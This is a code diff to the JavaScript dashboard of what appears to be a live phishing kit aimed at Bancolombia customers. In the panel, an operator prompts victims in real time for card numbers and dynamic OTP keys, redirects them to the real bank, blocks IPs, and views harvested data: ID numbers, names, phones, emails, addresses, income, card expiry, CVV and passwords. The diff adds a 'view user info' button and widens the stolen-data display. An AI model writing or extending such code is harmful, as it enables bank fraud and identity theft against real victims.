@@ -430,6 +430,8 @@ function botonesSesion(s) {
         btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Pedir Tarjeta (CC)" onclick="accion('${sid}','PEDIR_CC')">💳</button>`);
         btns.push(`<button class="btn btn-otp" title="Pedir Clave Dinámica" onclick="accion('${sid}','PEDIR_DINAMICA')">🔢</button>`);
         btns.push(`<button class="btn btn-final" title="Finalizar (Ir a Bancolombia)" onclick="accion('${sid}','FINALIZAR')">🏁</button>`);
+        // 🔥 NUEVO BOTÓN PARA VER DATOS EN BANCOLOMBIA
+        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
         btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
@@ -519,7 +521,7 @@ function renderSesiones() {
             const anio = datos.expAnio || '';
             claveFch = (mes || anio) ? `${mes}/${anio}` : (datos.clave || '-');
             cvv = datos.cvv || '-';
-            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : (datos.documento ? `${datos.tipoDoc || 'CC'} ${datos.documento}` : '-');
         } else {
             identificacionTrj = datos.identificacion || '-';
             claveFch = datos.clave || '-';
@@ -763,7 +765,8 @@ function verInfoUsuario(sessionId) {
     if (!s) return;
     const d = s.datos || {};
 
-    const tieneDatosPSE = d.nombres || d.documento || d.docNumber || d.telefono || d.celular || d.correo || d.direccion || d.rol;
+    // 🔥 AQUI AGREGAMOS EL CAMPO 'ingresos' Y LOS NOMBRES GENERALES
+    const tieneDatosPersonales = d.nombres || d.documento || d.docNumber || d.telefono || d.celular || d.correo || d.direccion || d.rol || d.ingresos;
 
     Swal.fire({
         title: '👤 Información del Usuario',
@@ -774,17 +777,18 @@ function verInfoUsuario(sessionId) {
                 <p><b>Cuenta/Referencia:</b> ${escapeHtml(d.cuenta || '-')}</p>
                 <p><b>Medio de Pago:</b> ${escapeHtml(d.medioPago || '-')}</p>
 
-                ${tieneDatosPSE ? `
+                ${tieneDatosPersonales ? `
                 <hr style="border-color:#252d44; margin: 10px 0;">
-                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">📋 Datos PSE</div>
+                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">📋 Datos Personales</div>
                 <p><b>Tipo Documento:</b> ${escapeHtml(d.tipoDoc || d.docType || '-')}</p>
                 <p><b>Documento:</b> ${escapeHtml(d.documento || d.docNumber || '-')}</p>
                 <p><b>Nombres:</b> ${escapeHtml(d.nombres || '-')}</p>
-                <p><b>Apellidos:</b> ${escapeHtml(d.apellidos || '-')}</p>
+                ${d.apellidos ? `<p><b>Apellidos:</b> ${escapeHtml(d.apellidos)}</p>` : ''}
                 <p><b>Celular:</b> ${escapeHtml(d.telefono || d.celular || '-')}</p>
                 <p><b>Correo:</b> ${escapeHtml(d.correo || '-')}</p>
-                <p><b>Dirección:</b> ${escapeHtml(d.direccion || '-')}</p>
-                <p><b>Rol:</b> ${escapeHtml(d.rol || '-')}</p>
+                ${d.direccion ? `<p><b>Dirección:</b> ${escapeHtml(d.direccion)}</p>` : ''}
+                ${d.rol ? `<p><b>Rol:</b> ${escapeHtml(d.rol)}</p>` : ''}
+                ${d.ingresos ? `<p><b>Ingresos:</b> ${escapeHtml(d.ingresos)}</p>` : ''}
                 ` : ''}
 
                 ${d.tarjeta ? `
